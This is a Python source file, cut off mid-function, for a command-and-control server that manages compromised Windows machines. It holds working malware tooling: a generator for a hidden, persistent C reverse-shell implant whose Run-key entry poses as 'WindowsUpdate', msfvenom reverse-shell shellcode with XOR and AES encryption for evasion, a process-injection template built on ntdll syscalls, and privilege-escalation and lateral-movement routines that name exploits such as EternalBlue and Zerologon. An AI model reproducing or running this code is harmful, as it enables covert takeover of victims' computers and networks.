#!/usr/bin/env python3
"""
C2 Framework - Main Server
Enhanced with Automated Post-Exploitation Module
"""

import socket
import threading
import queue
import json
import base64
import time
import os
import sys
import subprocess
import re
from datetime import datetime
from colorama import init, Fore, Style
import tempfile

init(autoreset=True)

class PostExploitationModule:
    """Automated post-exploitation module for privilege escalation and lateral movement"""
    
    def __init__(self, server):
        self.server = server
        self.reports = {}
        self.scan_results = {}
        
    def run_privesc_scan(self, target_id):
        """Run privilege escalation scan on target"""
        if target_id not in self.server.targets:
            return {"error": f"Target {target_id} not found"}
        
        print(f"{Fore.CYAN}[*] Starting privilege escalation scan on {target_id}")
        results = {
            "target": target_id,
            "timestamp": datetime.now().isoformat(),
            "vulnerabilities": [],
            "exploits": [],
            "recommendations": [],
            "windows_version": "Unknown",
            "user": "Unknown",
            "groups": []
        }
        
        # Send commands to gather information
        commands = [
            "whoami",
            "systeminfo",
            "net user",
            "net localgroup administrators",
            "wmic qfe list brief",
            "wmic os get caption,version",
            "wmic service list brief",
            "wmic process list brief"
        ]
        
        outputs = {}
        for cmd in commands:
            self.server.targets[target_id]['command_queue'].put(cmd)
            time.sleep(0.5)  # Wait for command to execute
            # Note: In real implementation, you'd capture output properly
            outputs[cmd] = f"Executed: {cmd}"
        
        # Parse Windows version
        if "systeminfo" in outputs:
            version_match = re.search(r"OS Name:\s*(.*?)(?:\r\n|\n)", outputs["systeminfo"])
            if version_match:
                results["windows_version"] = version_match.group(1).strip()
        
        # Parse user
        if "whoami" in outputs:
            user_match = re.search(r"(\w+\\.+\w+)", outputs["whoami"])
            if user_match:
                results["user"] = user_match.group(1).strip()
        
        # Check for common privilege escalation vulnerabilities
        vulnerabilities = []
        
        # Check if running as SYSTEM
        if "NT AUTHORITY\\SYSTEM" in results["user"]:
            vulnerabilities.append({
                "type": "high",
                "description": "Already running as SYSTEM - highest privileges",
                "impact": "Complete system compromise"
            })
        
        # Check for unquoted service paths
        # This would require more advanced command parsing
        
        # Check for Windows version vulnerabilities
        if results["windows_version"]:
            # Common Windows kernel exploits by version
            win_version_lower = results["windows_version"].lower()
            
            if "windows 10" in win_version_lower:
                vulnerabilities.append({
                    "type": "kernel_exploit",
                    "description": "Windows 10 - Check for CVE-2019-1458 or CVE-2020-0668",
                    "impact": "System privilege escalation"
                })
            elif "windows 7" in win_version_lower:
                vulnerabilities.append({
                    "type": "kernel_exploit",
                    "description": "Windows 7 - Check for CVE-2017-0143 (EternalBlue)",
                    "impact": "Remote code execution with SYSTEM privileges"
                })
            elif "windows server 2016" in win_version_lower:
                vulnerabilities.append({
                    "type": "kernel_exploit",
                    "description": "Windows Server 2016 - Check for CVE-2020-1472 (Zerologon)",
                    "impact": "Domain controller compromise"
                })
            elif "windows server 2012" in win_version_lower:
                vulnerabilities.append({
                    "type": "kernel_exploit",
                    "description": "Windows Server 2012 - Check for CVE-2020-1472",
                    "impact": "Domain controller compromise"
                })
            elif "windows 8" in win_version_lower:
                vulnerabilities.append({
                    "type": "kernel_exploit",
                    "description": "Windows 8 - Check for CVE-2019-1458",
                    "impact": "System privilege escalation"
                })
        
        # Check for WMI vulnerabilties
        if "wmic" in outputs:
            vulnerabilities.append({
                "type": "wmi",
                "description": "WMI available - Potential for WMI exploitation",
                "impact": "Service manipulation and persistence"
            })
        
        # Add recommendations
        recommendations = [
            "Run Windows Update to patch known vulnerabilities",
            "Enable UAC (User Account Control)",
            "Limit local administrator accounts",
            "Implement application whitelisting",
            "Disable unnecessary services"
        ]
        
        results["vulnerabilities"] = vulnerabilities
        results["recommendations"] = recommendations
        results["outputs"] = outputs  # Store raw outputs for debugging
        
        self.reports[target_id] = results
        return results
    
    def run_lateral_movement_scan(self, target_id):
        """Run lateral movement scan from target"""
        if target_id not in self.server.targets:
            return {"error": f"Target {target_id} not found"}
        
        print(f"{Fore.CYAN}[*] Starting lateral movement scan from {target_id}")
        
        results = {
            "target": target_id,
            "timestamp": datetime.now().isoformat(),
            "network_discovery": [],
            "domain_info": {},
            "potential_targets": [],
            "credentials": [],
            "shares": []
        }
        
        commands = [
            "ipconfig /all",
            "arp -a",
            "net view",
            "net view /domain",
            "nbtstat -n",
            "route print",
            "net share",
            "net use",
            "nltest /dclist:"
        ]
        
        for cmd in commands:
            self.server.targets[target_id]['command_queue'].put(cmd)
            time.sleep(0.5)
        
        # Parse network information
        # This would require proper output parsing
        
        # Generate potential targets
        potential_targets = []
        
        # Check for network shares
        if "net share" in outputs:
            share_matches = re.findall(r"(\w+)\s+(\w+)\s+([\w\s]+)", outputs["net share"])
            if share_matches:
                results["shares"] = [
                    {"name": s[0], "path": s[1], "description": s[2].strip()}
                    for s in share_matches[:5]
                ]
        
        # Check for domain controllers
        if "nltest /dclist:" in outputs:
            dc_matches = re.findall(r"\\\\(\w+)", outputs["nltest /dclist:"])
            if dc_matches:
                results["domain_info"]["controllers"] = dc_matches
        
        # Recommendations for lateral movement
        recommendations = [
            "Check for SMB signing disabled",
            "Look for weak passwords in password policy",
            "Check for default credentials",
            "Identify servers with RDP enabled",
            "Check for MSSQL or MySQL servers"
        ]
        
        results["recommendations"] = recommendations
        
        self.reports[target_id] = results
        return results
    
    def generate_report(self, target_id):
        """Generate a comprehensive report from scan results"""
        results = self.reports.get(target_id, {})
        if not results:
            return "No scan results available"
        
        report = f"""
{'='*70}
POST-EXPLOITATION REPORT: {target_id}
{'='*70}

TIMESTAMP: {results.get('timestamp', 'N/A')}
{'='*70}

PRIVILEGE ESCALATION ANALYSIS
{'-'*70}
Windows Version: {results.get('windows_version', 'Unknown')}
User: {results.get('user', 'Unknown')}

VULNERABILITIES FOUND:
{self._format_vulnerabilities(results.get('vulnerabilities', []))}

RECOMMENDATIONS:
{self._format_recommendations(results.get('recommendations', []))}

LATERAL MOVEMENT ANALYSIS
{'-'*70}
Network Discovery:
{self._format_discovery(results.get('network_discovery', []))}

Domain Information:
{json.dumps(results.get('domain_info', {}), indent=2)}

Potential Targets:
{self._format_targets(results.get('potential_targets', []))}

Credentials Found:
{self._format_credentials(results.get('credentials', []))}

Shares:
{self._format_shares(results.get('shares', []))}

{'='*70}
EXPLOIT SUGGESTIONS
{'-'*70}
{self._generate_exploit_suggestions(results)}
{'='*70}
"""
        return report
    
    def _format_vulnerabilities(self, vulns):
        if not vulns:
            return "  No vulnerabilities identified"
        
        output = []
        for v in vulns:
            output.append(f"  [!] {v.get('type', 'unknown').upper()}")
            output.append(f"      Description: {v.get('description', 'N/A')}")
            output.append(f"      Impact: {v.get('impact', 'N/A')}")
            output.append("")
        return "\n".join(output)
    
    def _format_recommendations(self, recs):
        if not recs:
            return "  No recommendations available"
        return "\n".join(f"  * {r}" for r in recs)
    
    def _format_discovery(self, discovery):
        if not discovery:
            return "  No network discovery data available"
        return "\n".join(f"  * {item}" for item in discovery[:10])
    
    def _format_targets(self, targets):
        if not targets:
            return "  No potential targets identified"
        return "\n".join(f"  * {t}" for t in targets[:10])
    
    def _format_credentials(self, creds):
        if not creds:
            return "  No credentials found"
        return "\n".join(f"  * {c}" for c in creds[:5])
    
    def _format_shares(self, shares):
        if not shares:
            return "  No shares found"
        return "\n".join(f"  * {s['name']} ({s['path']})" for s in shares[:5])
    
    def _generate_exploit_suggestions(self, results):
        suggestions = []
        
        # Privilege escalation suggestions
        vulns = results.get('vulnerabilities', [])
        for v in vulns:
            if v.get('type') == 'kernel_exploit':
                if 'Windows 10' in v.get('description', ''):
                    suggestions.append("• Try CVE-2019-1458 - Windows 10 x64 Local Privilege Escalation")
                    suggestions.append("• Try CVE-2020-0668 - Windows 10 Local Privilege Escalation")
                elif 'Windows 7' in v.get('description', ''):
                    suggestions.append("• Try CVE-2017-0143 - EternalBlue")
                    suggestions.append("• Try CVE-2017-0144 - EternalRomance")
                elif 'Server' in v.get('description', ''):
                    suggestions.append("• Try CVE-2020-1472 - Zerologon")
                    suggestions.append("• Try CVE-2019-0708 - BlueKeep")
        
        # Lateral movement suggestions
        if results.get('domain_info', {}):
            suggestions.append("• Check for SMB signing disabled")
            suggestions.append("• Try Pass-the-Hash attacks")
            suggestions.append("• Check for Kerberos vulnerabilities")
        
        if not suggestions:
            suggestions.append("• Run further enumeration using tools like WinPEAS or Seatbelt")
            suggestions.append("• Check for misconfigured services")
            suggestions.append("• Look for sensitive files or credentials")
        
        return "\n".join(f"  {s}" for s in suggestions)

class C2Server:
    def __init__(self):
        self.listeners = {}
        self.targets = {}
        self.target_counter = 0
        self.command_history = []
        self.running = True
        self.c2_directory = os.path.dirname(os.path.abspath(__file__))
        self.active_interactive = None
        self.post_exploit = PostExploitationModule(self)

        os.makedirs(f"{self.c2_directory}/payloads", exist_ok=True)
        os.makedirs(f"{self.c2_directory}/logs", exist_ok=True)
        os.makedirs(f"{self.c2_directory}/temp", exist_ok=True)
        os.makedirs(f"{self.c2_directory}/reports", exist_ok=True)
        
        self.load_config()
    
    def load_config(self):
        config_file = f"{self.c2_directory}/config.json"
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                self.config = json.load(f)
        else:
            self.config = {
                "default_port": 4444,
                "callback_interval": 60,
                "auto_persistence": False
            }
            with open(config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
    
    def start_listener(self, port):
        try:
            listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener_socket.bind(('0.0.0.0', port))
            listener_socket.listen(10)
            
            listener_id = f"listener_{port}"
            self.listeners[listener_id] = {
                'port': port,
                'socket': listener_socket,
                'active': True,
                'thread': threading.Thread(target=self.accept_connections, args=(listener_id, port))
            }
            
            self.listeners[listener_id]['thread'].start()
            print(f"{Fore.GREEN}[+] Listener started on port {port}")
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to start listener on port {port}: {e}")
            return False
    
    def accept_connections(self, listener_id, port):
        while self.listeners[listener_id]['active']:
            try:
                client, address = self.listeners[listener_id]['socket'].accept()
                self.target_counter += 1
                target_id = f"target_{self.target_counter}"
                
                print(f"{Fore.GREEN}[+] New connection from {address[0]}:{address[1]} -> {target_id}")
                
                self.targets[target_id] = {
                    'connection': client,
                    'address': address,
                    'port': port,
                    'last_seen': datetime.now(),
                    'os_info': None,
                    'shell_active': True,
                    'command_queue': queue.Queue(),
                    'thread': threading.Thread(target=self.handle_target, args=(target_id, client))
                }
                
                self.targets[target_id]['thread'].start()
                
            except Exception as e:
                if self.listeners[listener_id]['active']:
                    print(f"{Fore.RED}[-] Error accepting connection: {e}")
                break
    
    def handle_target(self, target_id, connection):
        """Handle target communication with proper output synchronization"""
        # Read initial OS info that payload sends
        try:
            connection.settimeout(2.0)
            initial_info = connection.recv(4096).decode('utf-8', errors='ignore')
            if initial_info:
                self.targets[target_id]['os_info'] = initial_info.strip()
                print(f"{Fore.CYAN}[*] Target {target_id} OS: {initial_info.strip()}")
            connection.settimeout(None)
        except:
            pass
        
        while self.targets[target_id]['shell_active']:
            try:
                if not self.targets[target_id]['command_queue'].empty():
                    cmd = self.targets[target_id]['command_queue'].get()
                    if cmd.lower() == 'exit':
                        connection.send(b"EXIT\n")
                        break
                    
                    # Send command
                    connection.send(cmd.encode() + b"\n")
                    
                    # Wait for command to execute
                    time.sleep(0.3)
                    
                    # Set timeout for receiving output
                    connection.settimeout(0.5)
                    
                    # Read all output
                    output = ""
                    try:
                        while True:
                            chunk = connection.recv(4096).decode('utf-8', errors='ignore')
                            if not chunk:
                                break
                            output += chunk
                    except socket.timeout:
                        pass
                    finally:
                        connection.settimeout(None)
                    
                    # Clean up output - remove the echoed command, prompts, and banner
                    lines = output.split('\n')
                    cleaned_lines = []
                    
                    for line in lines:
                        line_clean = line.strip()
                        
                        # Skip empty lines
                        if not line_clean:
                            continue
                        
                        # Skip lines that contain the command we just sent (echoed back)
                        if line_clean == cmd:
                            continue
                        
                        # Skip the Windows copyright banner
                        if 'Microsoft Corporation' in line or 'Tous droits rservs' in line:
                            continue
                        if 'Microsoft Corp' in line or 'All rights reserved' in line:
                            continue
                        
                        # Skip command prompts (anything ending with >)
                        if line_clean.endswith('>'):
                            continue
                        
                        # Skip lines that look like paths with > (e.g., C:\Windows\System32>)
                        if '>' in line_clean and any(drive in line_clean for drive in ['C:', 'D:', 'E:']):
                            continue
                        
                        # Skip GET_INFO lines
                        if 'GET_INFO' in line:
                            continue
                        
                        cleaned_lines.append(line_clean)
                    
                    cleaned_output = '\n'.join(cleaned_lines).strip()
                    
                    # Print output if there is any
                    if cleaned_output:
                        print(f"\n{Fore.YELLOW}[Output from {target_id}]{Style.RESET_ALL}")
                        print(cleaned_output)
                    
                    # Print the appropriate prompt
                    if self.active_interactive == target_id:
                        print(f"{Fore.CYAN}{target_id}> {Style.RESET_ALL}", end='', flush=True)
                    else:
                        print(f"\n{Fore.GREEN}C2> {Style.RESET_ALL}", end='', flush=True)
                
                time.sleep(0.1)
            
            except Exception as e:
                print(f"\n{Fore.RED}[-] Target {target_id} disconnected: {e}")
                break

        if target_id in self.targets:
            try:
                self.targets[target_id]['connection'].close()
            except:
                pass
            del self.targets[target_id]
    
    def run_privesc_scan(self, target_id):
        """Run privilege escalation scan"""
        results = self.post_exploit.run_privesc_scan(target_id)
        if "error" in results:
            print(f"{Fore.RED}[-] {results['error']}")
            return
        
        # Generate and save report
        report = self.post_exploit.generate_report(target_id)
        report_file = f"{self.c2_directory}/reports/privesc_{target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(report_file, 'w') as f:
            f.write(report)
        
        print(f"{Fore.GREEN}[+] Privilege escalation scan completed on {target_id}")
        print(f"{Fore.GREEN}[+] Report saved to: {report_file}")
        print(f"\n{Fore.CYAN}=== SCAN SUMMARY ==={Fore.RESET}")
        
        vulns = results.get('vulnerabilities', [])
        if vulns:
            print(f"{Fore.RED}[!] Found {len(vulns)} potential vulnerabilities!")
            for v in vulns:
                print(f"  - {v.get('description', 'N/A')}")
        else:
            print(f"{Fore.GREEN}[+] No obvious vulnerabilities found")
        
        print(f"{Fore.CYAN}Recommendations:")
        for rec in results.get('recommendations', []):
            print(f"  * {rec}")
        print()
        
        return results
    
    def run_lateral_movement_scan(self, target_id):
        """Run lateral movement scan"""
        results = self.post_exploit.run_lateral_movement_scan(target_id)
        if "error" in results:
            print(f"{Fore.RED}[-] {results['error']}")
            return
        
        report = self.post_exploit.generate_report(target_id)
        report_file = f"{self.c2_directory}/reports/latmov_{target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(report_file, 'w') as f:
            f.write(report)
        
        print(f"{Fore.GREEN}[+] Lateral movement scan completed on {target_id}")
        print(f"{Fore.GREEN}[+] Report saved to: {report_file}")
        
        return results
    
    def ghost_command(self, target_id, ip):
        """Kill all established connections from a specific IP on the target"""
        if target_id not in self.targets:
            print(f"{Fore.RED}[-] Target {target_id} not found")
            return
        
        ghost_cmd = f'for /f "tokens=5" %p in (\'netstat -ano ^| findstr {ip} ^| findstr ESTABLISHED\') do taskkill /PID %p /F'
        
        self.targets[target_id]['command_queue'].put(ghost_cmd)
        print(f"{Fore.RED}[!] Ghost command sent to {target_id} - Launching Process Ghosting on {ip} targets")
        print(f"{Fore.RED}[!] Running process from memory section")
    
    def compile_payload(self, source_file, output_name, payload_type="basic"):
        """Compile the payload with mingw compiler"""
        
        if not os.path.exists(source_file):
            print(f"{Fore.RED}[-] Source file not found: {source_file}")
            return False
        
        output_path = f"{self.c2_directory}/payloads/{output_name}"
        
        if payload_type == "basic":
            compile_cmd = f"x86_64-w64-mingw32-gcc {source_file} -o {output_path}.exe -lwininet -lws2_32 -static -s"
        elif payload_type == "injection":
            compile_cmd = f"x86_64-w64-mingw32-g++ -o {output_path}.exe {source_file} -lpsapi -m64 -static -O2 -s -Wl,--strip-all"
        elif payload_type == "hollowing":
            compile_cmd = f"x86_64-w64-mingw32-g++ -o {output_path}.exe {source_file} -lpsapi -m64 -static -O2 -s -Wl,--strip-all -Wno-write-strings -ffunction-sections -fdata-sections"
        else:
            print(f"{Fore.RED}[-] Unknown payload type: {payload_type}")
            return False
        
        print(f"{Fore.CYAN}[*] Compiling {output_name}.exe...")
        try:
            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                print(f"{Fore.GREEN}[+] Successfully compiled: {output_path}.exe")
                return True
            else:
                print(f"{Fore.RED}[-] Compilation failed: {result.stderr}")
                return False
        except subprocess.TimeoutExpired:
            print(f"{Fore.RED}[-] Compilation timed out")
            return False
        except Exception as e:
            print(f"{Fore.RED}[-] Compilation error: {e}")
            return False
    
    def validate_process_name(self, process_name):
        """Validate and clean process name"""
        process_name = re.sub(r'[\\/:*?"<>|]', '', process_name)
        if not process_name.endswith('.exe'):
            process_name += '.exe'
        return process_name
    
    def generate_payload(self, ip, port, persistence=False):
        """Generate a new payload with specified callback IP and port"""
        
        print(f"{Fore.CYAN}[?] Enter executable name (without .exe): {Style.RESET_ALL}", end='')
        exe_name = input().strip()
        if not exe_name:
            exe_name = f"payload_{ip}_{port}"
        
        c_code = f'''#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#pragma comment(lib, "wininet.lib")

void AddToStartup() {{
    char path[MAX_PATH];
    char cmd[MAX_PATH + 50];
    
    GetModuleFileName(NULL, path, MAX_PATH);
    snprintf(cmd, sizeof(cmd), 
             "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsUpdate /t REG_SZ /d \\"%s\\" /f", 
             path);
    system(cmd);
}}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);
    
    AddToStartup();
    
    while(1) {{
        WSADATA wsaData;
        SOCKET sock;
        struct sockaddr_in server;
        char buffer[4096];
        int bytes_received;
        
        WSAStartup(MAKEWORD(2,2), &wsaData);
        
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {{
            WSACleanup();
            Sleep(60000);
            continue;
        }}
        
        server.sin_family = AF_INET;
        server.sin_port = htons({port});
        server.sin_addr.s_addr = inet_addr("{ip}");
        
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {{
            closesocket(sock);
            WSACleanup();
            Sleep(60000);
            continue;
        }}
        
        char os_info[256];
        DWORD version = GetVersion();
        snprintf(os_info, sizeof(os_info), "Windows [%%d.%%d]", 
                 (BYTE)(version), (BYTE)(version >> 8));
        send(sock, os_info, strlen(os_info), 0);
        
        while (1) {{
            memset(buffer, 0, sizeof(buffer));
            bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
            
            if (bytes_received <= 0) {{
                break;
            }}
            
            buffer[bytes_received] = '\\0';
            
            char* newline = strchr(buffer, '\\n');
            if (newline) *newline = '\\0';
            
            if (strcmp(buffer, "EXIT") == 0) {{
                closesocket(sock);
                WSACleanup();
                return 0;
            }}
            
            char cmd_line[2048];
            snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /c %s 2>&1", buffer);
            
            SECURITY_ATTRIBUTES sa;
            HANDLE hRead, hWrite;
            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            char output[65536] = {{0}};
            DWORD bytes_read;
            
            sa.nLength = sizeof(sa);
            sa.bInheritHandle = TRUE;
            sa.lpSecurityDescriptor = NULL;
            
            if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {{
                send(sock, "Error creating pipe\\r\\n", 21, 0);
                continue;
            }}
            
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            si.hStdError = hWrite;
            si.hStdOutput = hWrite;
            si.dwFlags |= STARTF_USESTDHANDLES;
            si.wShowWindow = SW_HIDE;
            si.dwFlags |= STARTF_USESHOWWINDOW;
            
            ZeroMemory(&pi, sizeof(pi));
            
            if (CreateProcess(NULL, cmd_line, NULL, NULL, TRUE, 
                            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {{
                WaitForSingleObject(pi.hProcess, 5000);
                
                while (PeekNamedPipe(hRead, NULL, 0, NULL, &bytes_read, NULL) && bytes_read > 0) {{
                    char temp[4096];
                    DWORD read;
                    if (ReadFile(hRead, temp, sizeof(temp) - 1, &read, NULL) && read > 0) {{
                        temp[read] = '\\0';
                        strncat(output, temp, sizeof(output) - strlen(output) - 1);
                    }}
                }}
                
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }} else {{
                strcpy(output, "Error executing command\\r\\n");
            }}
            
            CloseHandle(hRead);
            CloseHandle(hWrite);
            
            if (strlen(output) == 0) {{
                send(sock, "\\r\\n", 2, 0);
            }} else {{
                send(sock, output, strlen(output), 0);
            }}
        }}
        
        closesocket(sock);
        WSACleanup();
        Sleep(60000);
    }}
    
    return 0;
}}'''
    
        if not persistence:
            c_code = c_code.replace('    AddToStartup();\n    \n', '')
    
        payload_file = f"{self.c2_directory}/payloads/{exe_name}.c"
        with open(payload_file, 'w') as f:
            f.write(c_code)
    
        print(f"{Fore.GREEN}[+] Payload C code saved to: {payload_file}")
        
        if self.compile_payload(payload_file, exe_name, "basic"):
            print(f"{Fore.GREEN}[+] Payload ready: {self.c2_directory}/payloads/{exe_name}.exe")
        else:
            print(f"{Fore.YELLOW}[!] Manual compilation required:")
            print(f"    x86_64-w64-mingw32-gcc {payload_file} -o {exe_name}.exe -lwininet -lws2_32 -static -s")
            print(f"    i686-w64-mingw32-gcc {payload_file} -o {exe_name}_32.exe -lwininet -lws2_32 -static -s")
    
        return payload_file
    
    def generate_process_injection_payload(self, ip, port, target_process, persistence=False):
        """Generate process injection payload with custom target process"""
        
        print(f"{Fore.CYAN}[?] Enter executable name (without .exe): {Style.RESET_ALL}", end='')
        exe_name = input().strip()
        if not exe_name:
            exe_name = f"inject_{target_process}_{ip}_{port}"
        
        target_process_full = self.validate_process_name(target_process)
        
        print(f"{Fore.CYAN}[*] Generating process injection payload for {ip}:{port} -> Target: {target_process_full}")
        
        temp_dir = f"{self.c2_directory}/temp"
        os.makedirs(temp_dir, exist_ok=True)
        
        binary_file = f"{temp_dir}/reverse_{ip}_{port}.bin"
        
        print(f"{Fore.CYAN}[*] Generating shellcode...")
        msfvenom_cmd = [
            "msfvenom",
            "-p", "windows/x64/shell_reverse_tcp",
            f"LHOST={ip}",
            f"LPORT={port}",
            "-f", "raw",
            "-o", binary_file
        ]
        
        try:
            subprocess.run(msfvenom_cmd, check=True, capture_output=True, text=True)
            print(f"{Fore.GREEN}[+] Reverse shell binary created")
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] msfvenom failed: {e.stderr}")
            return None
        except FileNotFoundError:
            print(f"{Fore.RED}[-] msfvenom not found!")
            return None
        
        encryption_script = '''#!/usr/bin/env python3
import os
import sys
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def generate_encrypted_shellcode(input_file, output_file="shellcode_output.txt"):
    if not os.path.exists(input_file):
        print(f"Error: {input_file} not found!")
        sys.exit(1)
    
    with open(input_file, 'rb') as f:
        shellcode = f.read()
    
    print(f"[*] Original shellcode size: {len(shellcode)} bytes")
    
    xor_key = 0xAA
    xor_encrypted = bytes([b ^ xor_key for b in shellcode])
    
    aes_key_raw = os.urandom(32)
    aes_iv = os.urandom(16)
    
    aes_key_hashed = hashlib.sha256(aes_key_raw).digest()
    
    cipher = AES.new(aes_key_hashed, AES.MODE_CBC, aes_iv)
    aes_encrypted = cipher.encrypt(pad(xor_encrypted, AES.block_size))
    
    print(f"[*] AES encrypted size: {len(aes_encrypted)} bytes")
    
    encode_xor = 0xDE
    encoded_key = bytes([b ^ encode_xor for b in aes_key_raw])
    encoded_iv = bytes([b ^ encode_xor for b in aes_iv])
    
    output = []
    output.append("// AES-256-CBC encrypted shellcode (with XOR layer)")
    output.append("unsigned char encrypted_buf[] = {")
    for i in range(0, len(aes_encrypted), 16):
        chunk = aes_encrypted[i:i+16]
        line = "    " + ", ".join(f"0x{b:02x}" for b in chunk)
        if i + 16 < len(aes_encrypted):
            line += ","
        output.append(line)
    output.append("};")
    output.append(f"const SIZE_T encrypted_size = {len(aes_encrypted)};")
    output.append(f"const SIZE_T original_size = {len(shellcode)};\\n")
    
    output.append("// XOR-encoded AES-256 key (will be SHA-256 hashed by CryptDeriveKey)")
    output.append("unsigned char encoded_aes_key[] = {")
    for i in range(0, 32, 16):
        chunk = encoded_key[i:i+16]
        line = "    " + ", ".join(f"0x{b:02x}" for b in chunk)
        if i + 16 < 32:
            line += ","
        output.append(line)
    output.append("};\\n")
    
    output.append("// XOR-encoded AES IV")
    output.append("unsigned char encoded_aes_iv[] = {")
    for i in range(0, 16, 16):
        chunk = encoded_iv[i:i+16]
        if len(chunk) > 0:
            line = "    " + ", ".join(f"0x{b:02x}" for b in chunk)
            output.append(line)
    output.append("};")
    
    with open(output_file, 'w') as f:
        f.write('\\n'.join(output))
    
    print(f"[+] Output written to: {output_file}")
    
    decoded_key = bytes([b ^ encode_xor for b in encoded_key])
    decoded_iv = bytes([b ^ encode_xor for b in encoded_iv])
    decoded_key_hashed = hashlib.sha256(decoded_key).digest()
    
    decipher = AES.new(decoded_key_hashed, AES.MODE_CBC, decoded_iv)
    decrypted_padded = decipher.decrypt(aes_encrypted)
    
    from Crypto.Util.Padding import unpad
    xor_decrypted = unpad(decrypted_padded, AES.block_size)
    original = bytes([b ^ xor_key for b in xor_decrypted])
    
    if original == shellcode:
        print("[✓] Verification PASSED - encryption/decryption works!")
    else:
        print("[!] Verification FAILED")
    
    return output_file

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 encrypt_final.py <reverse.bin>")
        sys.exit(1)
    
    generate_encrypted_shellcode(sys.argv[1])
'''
        
        script_path = f"{temp_dir}/encrypt.py"
        with open(script_path, 'w') as f:
            f.write(encryption_script)
        
        print(f"{Fore.CYAN}[*] Encrypting shellcode...")
        try:
            result = subprocess.run(["python3", script_path, binary_file], cwd=self.c2_directory, capture_output=True, text=True)
            if result.returncode != 0:
                print(f"{Fore.RED}[-] Encryption failed: {result.stderr}")
                return None
            print(result.stdout)
        except Exception as e:
            print(f"{Fore.RED}[-] Encryption error: {e}")
            return None
        
        shellcode_output = f"{self.c2_directory}/shellcode_output.txt"
        if not os.path.exists(shellcode_output):
            print(f"{Fore.RED}[-] Shellcode output not found")
            return None
        
        with open(shellcode_output, 'r') as f:
            shellcode_data = f.read()
        
        injection_template = f'''#include <windows.h>
#include <wininet.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <vector>
#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

SHELLCODE_DATA_PLACEHOLDER

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

pNtAllocateVirtualMemory NtAllocateVirtualMemory = 0;
pNtWriteVirtualMemory NtWriteVirtualMemory = 0;
pNtCreateThreadEx NtCreateThreadEx = 0;
pNtProtectVirtualMemory NtProtectVirtualMemory = 0;

BOOL InitializeSyscalls() {{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;
    
    NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    
    return (NtAllocateVirtualMemory && NtWriteVirtualMemory && NtCreateThreadEx && NtProtectVirtualMemory);
}}

LPVOID DecryptShellcode(SIZE_T* decrypted_size) {{
    BYTE aes_key[32];
    BYTE aes_iv[16];
    
    for (int i = 0; i < 32; i++) {{
        aes_key[i] = encoded_aes_key[i] ^ 0xDE;
    }}
    for (int i = 0; i < 16; i++) {{
        aes_iv[i] = encoded_aes_iv[i] ^ 0xDE;
    }}
    
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    
    if (!CryptAcquireContextA(&hProv, 0, MS_ENH_RSA_AES_PROV_A, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
        if (!CryptAcquireContextA(&hProv, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
            return 0;
        }}
    }}
    
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {{
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    if (!CryptHashData(hHash, aes_key, 32, 0)) {{
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, CRYPT_EXPORTABLE, &hKey)) {{
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return 0;
    }}
    
